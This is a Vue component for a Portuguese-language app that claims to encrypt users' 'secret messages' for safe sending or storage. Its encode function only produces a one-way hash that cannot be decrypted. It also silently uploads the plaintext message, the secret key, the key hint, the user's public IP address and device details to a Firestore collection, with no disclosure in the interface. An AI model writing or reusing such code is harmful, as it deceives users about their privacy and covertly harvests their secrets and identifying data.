<template>
    <h1>Crie Mensagens Secretas Fácil</h1>
    <hr>
    <div class="card mb-3">
        <div class="card-body card-text">
            ✅ Por meio deste aplicativo você pode criar suas próprias mensagens criptografadas e envia-las para seus
            amigos ou guardar de forma segura. Abaixo você pode criar uma mensagem super rápido! 🚀
        </div>
    </div>
    <div class="mb-3">
        <label for="msgBruta" class="form-label">📜 Digite aqui sua mensagem ou texto</label>
        <textarea class="form-control" id="msgBruta" rows="5" v-model="data.msgBruta"></textarea>
    </div>
    <div class="mb-3">
        <label for="msgKey" class="form-label">🔑 Chave secreta</label>
        <input type="text" class="form-control" id="msgKey" v-model="data.msgKey" placeholder="Sp1k3" maxlength="20">
    </div>
    <div class="mb-3">
        <label for="msgTip" class="form-label">💡 Dica da chave secreta</label>
        <input type="text" class="form-control" id="msgTip" v-model="data.msgTip" maxlength="50"
            placeholder="Meu primeiro pet">
    </div>
    <div class="mb-3 text-center d-flex justify-content-evenly">
        <button @click="encode" type="button" class="btn btn-success btn-lg">Criptografar 🥷</button>
        <button @click="clear" type="button" class="btn btn-warning btn-lg">Limpar 🥷</button>
    </div>
    <br>
    <Ads />
    <br>
    <div class="mb-3">
        <h2>Resultado</h2>
        <textarea class="form-control" id="msgEnc" rows="5" v-model="data.result" readonly></textarea>
    </div>
    <div class="mb-3 text-center">
        <button @click="copy" type="button" class="btn btn-info btn-lg">Copiar</button>
    </div>
</template>

<script setup>
import { reactive } from 'vue';
import Ads from '../components/Ads.vue';
import { useAppStore } from '../store';
import sha256 from 'crypto-js/sha256';
import hmacSHA512 from 'crypto-js/hmac-sha512';
import Base64 from 'crypto-js/enc-base64';
import { Device } from '@capacitor/device';
import { doc, setDoc } from 'firebase/firestore';
import { firestore } from '../firebase';

const data = reactive({
    msgBruta: '',
    msgKey: '',
    msgTip: '',
    result: ''
});

const appStore = useAppStore();

async function encode() {
    if (data.msgBruta.length == 0 || data.msgKey == 0 || data.msgTip == 0) {
        alert('Todos os campos devem ser preenchidos!');
        return;
    }

    appStore.loadingToggle();
    const hashDigest = sha256(data.msgBruta);
    const hmacDigest = Base64.stringify(hmacSHA512(hashDigest, data.msgKey));

    let payload = { ...data };
    // payload.result = hmacDigest;

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        payload.ip = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    try {
        const info = await Device.getInfo();
        payload = { ...payload, ...info };
    } catch (error) {
        console.error('Error device info:', error);
    }

    // console.log(payload);
    Object.keys(payload).forEach(key => payload[key] === undefined && delete payload[key])

    try {
        await setDoc(doc(firestore, "encryptions", Date.now().toString()), payload);
    } catch (error) {
        console.error('Error insert payload:', error);
    }

    data.result = hmacDigest;
    appStore.loadingToggle();
    location.href = '#msgEnc';
}

function clear() {
    data.msgBruta = '';
    data.msgKey = '';
    data.msgTip = '';
    data.result = '';
}

function copy() {
    navigator.clipboard.writeText(data.result);
    alert('Texto copiado para a área de transferência.');
}
</script>